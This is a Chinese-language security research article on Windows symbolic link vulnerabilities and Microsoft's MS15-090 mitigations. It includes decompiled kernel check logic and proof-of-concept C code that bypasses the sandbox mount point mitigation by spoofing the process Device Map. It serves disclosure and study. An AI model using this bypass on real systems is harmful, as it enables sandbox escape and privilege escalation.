# Symbolic Link漏洞简单背景介绍

0x00 背景
=====

Symbolic Link是微软Windows系统上一项关键机制，从Windows NT3.1开始引入对象和注册表Symbolic Link后，微软从Windows2000开始也引入了NTFS Mount Point和Directory Juntions，这些机制对于熟悉Windows内部机理的技术人员并不陌生，在著名的Windows Internals系列中，也有介绍这些机制。在过去，安全人员利用Symbolic Link来攻击系统安全机制或安全软件，也并不少见。

而这项技术重新火起来，要归功于2014年BlackHat上 James Forshaw爆出的大量利用mount point、注册表的符号链接来绕过IE11的EPM沙箱的事件，在此之后， James Forshaw仍在不断挖掘和通过Google Project Zero爆出大量利用这些机制的类似逻辑漏洞，通过这些漏洞可以穿透IE11的EPM沙箱，或者利用系统服务提升权限等。在2015年的Syscan上，他则以一篇《A Link to the Past: Abusing Symbolic Links on Windows》给这些漏洞和攻击方式做了更好地总结。

360Vulcan Team也发现了多个使用Symbolic Link绕过EPM沙盒的漏洞，在今年的HITCON安全会议上，我们就公开了我们发现的CVE-2014-6322等沙盒绕过漏洞，包括一个未公开的EPM沙盒绕过漏洞。

之所以利用Symbolic Link进行攻击的漏洞频繁出现，是和低权限程序可以操作全局对象的符号链接，使得高权限程序访问非预期的资源有重要关系的。这类漏洞不仅仅局限在Windows平台上，著名的iOS6/7越狱程序Evasion也是利用了苹果iOS系统内服务对于符号链接的处理问题实现了最初的攻击步骤。

0x01 微软的缓和措施
=====

随着这些漏洞攻击的频繁爆出，微软也在寻找更有效地缓和方式，既然低权限创建符号链接是问题的关键所在，那么封堵低权限程序创建符号链接就成了自然会想到的解决方案。

在今年的五月份，Windows 10推出了内测版本Build 10120，在360安全团队进行分析后就发现，在这个版本微软就加入了针对注册表符号链接的防护，禁止”sandboxed”的低权限进程创建注册表符号链接。在随后的多个内测版本中，微软又持续加入了针对对象的符号链接创建防护和针对Mount Point（目录挂载点）链接的防护，禁止低权限的程序创建这些链接。 具体来说，这些防护措施修改在Windows内核程序(ntoskrnl.exe)内，在创建注册表、文件和对象的符号链接时，系统会使用RtlIsSandboxedToken来判断当前的token是否在低完整性级别或者以下（例如AppContainer)。如果是的话，针对这三种符号链接，会采取不同的策略：

1.  针对注册表符号链接： 完全禁止创建，禁止沙盒内的程序创建任何注册表符号连接
    
2.  针对对象符号链接： 沙盒内程序可以创建对象符号链接，但是对象符号连接的Object上会增加特别的Flag，当非沙盒的程序遇到沙盒程序创建的符号链接时，符号链接不会生效
    
3.  针对文件（Mount Point)符号链接：沙盒内程序在创建对象符号链接时，系统会检查对于被链接到的目标目录（例如将`c:\test\low\`链接到目标`c:\windows\目录`)，当前进程是否具备写入（包括写入、追加、删除、修改属性等）权限，如果不具备这些权限，或者无法打开目标目录（例如目标目录不存在），则会拒绝。
    

在Windows10 RTM正式发布后，微软又以不同寻常的速度（用James Forshaw的话来说，简直就不敢让人相信是微软干的）将这个安全缓和移植到了低版本的Windows操作系统上。

在今年8月11日，微软发布了MS15-090补丁，在`Windows Vista\7\8\8.1`及服务器操作系统上修复了`CVE-2015-2428\CVE-2015-2429\CVE-2015-2430`这三个漏洞，而这个补丁的实质，就是将对象、注册表、文件系统这三个符号链接的缓和防护移植到了这些操作系统上。微软这些以相当有执行力的速度，试图将这类漏洞彻底终结，送入历史之中。

那么，是不是对于Windows 10，包括打了8月补丁的Windows7, 8, 8.1等操作系统，这些符号链接的漏洞就和我们永远说拜拜了呢？

答案当然是否定的，就如James Forshaw在44CON的议题标题所说， 2 Steps Forward, 1 Step Back，在开发这些缓和措施的过程中，水平不到位的安全/开发人员，也会犯这样那样的错误，使得我们在深入研究和分析这些机制后，仍然可能找出突破他们的方式。

0x02 针对缓和的绕过
=====

在这里，本文就是要介绍一种绕过Windows 10 Mount Point Mitigation（目录挂载点缓和）的方式，由于这个缓和在Windows7/8/8.1等系统上是通过MS15-090得到修复的，因此这里介绍的方法也是对MS15-090（CVE-2015-2430）的绕过攻击方式。

前面我们说到，针对文件/目录的Mount Point符号链接，系统并没有彻底禁止沙盒的程序去创建它们，而是会检查对应被链接到的目标目录，当前进程是否具备可写的权限，如果可写（例如我们将同是位于低完整性级别目录下的两个继承目录进行链接），链接是可以被创建的。这就给我们突破这个防护提供了一个攻击面，那么我们来看看这个检查具体是怎么实现的呢？

这个检查的代码是位于`IopXxxControlFile`中的，内核调用`NtDeviceIoControl`和`NtFsControlFile`最终都要调用到这个函数中，这个函数负责为设备调用封装IRP并进行IRP发送工作，`FSCTL_SET_REPARSE_POINT`这个用于设置NTFS Mount Point的设备控制码自然也不例外。在这个函数中，微软增加了针对`FSCTL_SET_REPARSE_POINT`的特殊检查处理，逻辑并不复杂，这里我列出如下：

```
if ( IoControlCode == FSCTL_SET_REPARSE_POINT ) 
{
     ReparseBuffer = Irp_1->AssociatedIrp.SystemBuffer;
     if ( InputBufferLength >= 4 && ReparseBuffer->ReparseTag == IO_REPARSE_TAG_MOUNT_POINT )
     {
       SubjectSecurityContext.ClientToken = 0;
       SubjectSecurityContext.ImpersonationLevel = 0;
       SubjectSecurityContext.PrimaryToken = 0;
       SubjectSecurityContext.ProcessAuditId = 0;
       bIsSandboxedProcess = CurrentThread;
       CurrentProcess = IoThreadToProcess(CurrentThread);
       SeCaptureSubjectContextEx(bIsSandboxedProcess, CurrentProcess, &SubjectSecurityContext);
       LOBYTE(bIsSandboxedProcess) = RtlIsSandboxedToken(&SubjectSecurityContext, AccessMode[0]);
       status = SeReleaseSubjectContext(&SubjectSecurityContext);
       if ( bIsSandboxedProcess )
       {
          status_1 = FsRtlValidateReparsePointBuffer(InputBufferLength, ReparseBuffer);
          if ( status_1 < 0 )
          {
             IopExceptionCleanup(Object, Irp_1, *&v79[1], 0);
             return status_1;
           }
           NameLength = ReparseBuffer->MountPointReparseBuffer.SubstituteNameLength;
           MaxLen = NameLength;
           NameBuffer = ReparseBuffer->MountPointReparseBuffer.PathBuffer;
           ObjectAttributes.Length = 24;
           ObjectAttributes.RootDirectory = 0;
           ObjectAttributes.Attributes = OBJ_FORCE_ACCESS_CHECK | OBJ_KERNEL_HANDLE
           ObjectAttributes.ObjectName = &NameLength;
           ObjectAttributes.SecurityDescriptor = 0;
           ObjectAttributes.SecurityQualityOfService = 0;
           status_2 = ZwOpenFile(&FileHandle, 
                                  0x120116u,
                                  &ObjectAttributes,
                                  &IoStatusBlock,
                                  FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                                  FILE_DIRECTORY_FILE);
           if ( status_2 < 0 )
           {
              IopExceptionCleanup(Object, Irp_1, *&v79[1], 0);
              return status_2;
           }
           status = ZwClose(FileHandle);
     }
}

```

通过这段代码我们可以看到， 当`IoControlCode`为`FSCTL_SET_REPARSE_POINT`时，函数会检查`ReparseTag`是否为`IO_REPARSE_TAG_MOUNT_POINT`，如果是Mount Point的操作，接下来就会使用`RtlIsSandboxedToken`来检查当前进程是否是沙盒进程，如果是沙盒进程，在使用`FsRtlValidateReparsePointBuffer`检查reparse point的缓存数据格式后（这个函数在文件系统驱动处理`reparse point`操作时也会用到），将目标目录的路径提取出来，使用`ZwOpenFile`尝试打开它， 如果无法打开，就返回拒绝。

这里打开文件有个很关键的步骤，大家可以看到代码里`ObjectAttributes.Attributes`设置了包含`OBJ_FORCE_ACCESS_CHECK`标志。这里就是要求 ZwOpenFile 去强制检查当前进程是否有权限打开这个目录，否则`ZwOpenFile`通过内核模式转换后，是直接无视权限检查的。

这个检查似乎很严密，我们如何突破呢？笔者仔细研究了下相关的机制，本来想看看是否能通过在PathBuffer中调换`SubsituteName`和`PrintName`位置的方式（这段代码默认`SubsituteName`在前）来欺骗检查逻辑，但后来发现`FsRtlValidateReparsePointBuffer`的预检查中，已经强制要求了`SubsituteName`必须在前。

再深入看看Ntfs和Ntos针对Set Reparse Point的实现，笔者发现Reparse Point具体的目标对象的解析和处理并不是在ntfs中当前进程完成的，ntfs在收到set reparse point的file system control请求后，只是将这个信息以文件系统结构存储起来，而直到访问这个mount point的程序去访问对应的路径时，ntos的IO子系统才会去处理和解析相关的数据，也就是说，我们当前进程发送过去的路径， 是并不在当前进程中具体去处理的，也就是说，它在当前进程里是可以无效或必并不指向我们原先想要的目标的。

根据这个事实，就不难想出，我们可以让这里的ZwOpenFile在我们的进程里，打开的其实并非c:\windows的目录，而这个路径在外面的进程看起来，则需要时真正的c:\windows。

笔者稍微复习了下IO子系统的代码，很快就想出了对应的欺骗技巧：Device Map

进程的Device Map是针对系统中的进程设置“虚拟DOS设备路径”的系统机制， 它可以通过NtSetInformationProcess/NtQueryInformationProcess的ProcessDeviceMap功能号来设置和查询。

当系统内核打开一个诸如c:\windows的DOS路径时，NTDLL会首先将其前面加上\??\，使其变为一个NT路径：`\??\c:\windows`，通常来说\??\指向\GLOBAL??\，而\GLOBAL??\下就有C:这个指向\Device\HarddiskVolumeX等磁盘分区设备的符号链接，使得最终系统的对象子系统能够找到对应的文件系统驱动发送相关的文件操作请求。

而Device Map的修改机制，允许我们将\??\指向其他的对象目录，在ProcessDeviceMap中，我们只要填写对应的对象目录句柄，就可以将当前进程（或者被设置的对应进程）的\??\映射到我们的对象目录中，例如将 \??\不再指向\GLOBAL??\，而是\BaseNamedObjects。这项机制允许程序具备多个虚拟的\??\根目录，这被Windows自己的内核机制例如WindowStation管理机制所使用。

而在这里，我们正好就可以使用这个技巧，来绕过ZwOpenFile的安全检查，步骤如下：

（假设我们用于测试的低权限可访问目录为`c:\users\test\desktop\low`)

1.  创建`c:\users\test\desktop\low\windows`目录，这个目录我们可以访问，另外在low下在创建一个任意名字的目录用来链接Windows目录，例如叫做Low\demo目录，这里之所以要先创建，是因为我们后面要修改系统默认DOS设备根目录，再使用win32 api操作文件会比较麻烦
    
2.  将当前`Device Map`即`\??\`通过`NtSetInformationProcess`映射到一个我们可写的对象目录，例如对于低完整性进程，`\Session\X\BaseNamedObjects`对象目录就可以，我们可以将其映射到这个目录来
    
3.  在`\Session\X\BaseNamedObjects`对象目录下创建一个对象符号链接，名为C: , 链接到`\GLOBAL??\c:\users\test\desktop\low`，注意这里必须要用GLOBAL??而不是\??\因为默认的\??\已经被我们改到别的地方了
    

这里的对象符号链接是我们当前进程自己用的，按前面说的，沙盒内的符号链接只有沙盒进程能用，所以是没有问题的。

1.  此时，当前进程的`\??\c:\windows`，实际变成了`\BaseNamedObjects\c:\windows`，而因为\BaseNamedObjects下面的C:是我们设置好的符号链接，因此这个路径最终会被解析为`\GLOBAL??\C:\users\test\desktop\low\windows`，也就是我们在第一步里创建的那个我们可以访问的Windows目录
    
2.  最后，为low下的demo目录创建链接到`\??\c:\windows`，这里IopXxxControlFile在使用ZwOpenFile进行权限检查时，自然就检查到了我们设置的欺骗目录，并认为我们具备对这个目录的写入权限，从而允许创建。
    
3.  然而，在创建完成Mount Point后，这个路径信息已经被载入文件系统中， 其他进程再来访问时，会发现这个demo目录指向真正的`\??\c:\windows`目录， 我们成功实现绕过Mount Point缓和，创建有效的低权限可访问的、链接到高权限目录的符号链接。
    

下面是攻击的示例关键代码：

```
CreateDirectory("c:\\users\\test\\desktop\\low\\windows" , 0 )
CreateDirectory("c:\\users\\test\\desktop\\low\\demo" , 0)
HANDLE hlink = CreateFile("c:\\users\\test\\desktop\\low\\demo" , GENERIC_WRITE , FILE_SHARE_READ , 0 , OPEN_EXISTING , FILE_FLAG_BACKUP_SEMANTICS, 0 );
NtOpenDirectoryObject(&hObjDir , DIRECTORY_TRAVERSE , &oba); 
//"\\Sessions\\1\\BaseNamedObjects"
NtSetInformationProcess(GetCurrentProcess() , ProcessDeviceMap , &hObjDir ,sizeof(HANDLE));
NtCreateSymbolicLinkObject(&hObjLink , LINK_QUERY , &oba2 , &LinkTarget) ; 
//oba2: "\\??\\c:" link target:"\\GLOBAL??\\C:\\users\ \test\\desktop\\low"

WCHAR NtPath[MAX_PATH] = L"\\??\\C:\\WINDOWS\\";
WCHAR wdospath[MAX_PATH] = L"c:\\windows\\";

DWORD btr ; 
PREPARSE_DATA_BUFFER pBuffer;
DWORD buffsize ;
pBuffer = (PREPARSE_DATA_BUFFER)malloc(sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 + 2);

pBuffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
pBuffer->ReparseDataLength = sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 - 8 ;
pBuffer->Reserved = 0 ; 
pBuffer->MountPointReparseBuffer.SubstituteNameLength = wcslen(NtPath) * 2 ;
pBuffer->MountPointReparseBuffer.SubstituteNameOffset = 0 ; 
pBuffer->MountPointReparseBuffer.PrintNameLength = wcslen(wdospath) * 2 ;
pBuffer->MountPointReparseBuffer.PrintNameOffset = wcslen(NtPath) * 2 + 2 ; 
memcpy((PCHAR)pBuffer->MountPointReparseBuffer.PathBuffer , (PCHAR)NtPath , wcslen(NtPath) * 2 + 2);
memcpy((PCHAR)((PCHAR)pBuffer->MountPointReparseBuffer.PathBuffer + wcslen(NtPath) * 2 + 2) ,
 (PCHAR)wdospath ,
 wcslen(wdospath) * 2 + 2) ; 
buffsize = sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 ;

DeviceIoControl(hlink , FSCTL_SET_REPARSE_POINT , pBuffer , buffsize, NULL , 0 , &btr , 0 );

```

测试程序成功的截图如下：

可以看到低权限的poc_mklink成功创建目录1，链接到c:\windows的junction。

![enter image description here](http://drops.javaweb.org/uploads/images/0876ba4050e3f7f7375fa073502dee4f2211dda4.jpg)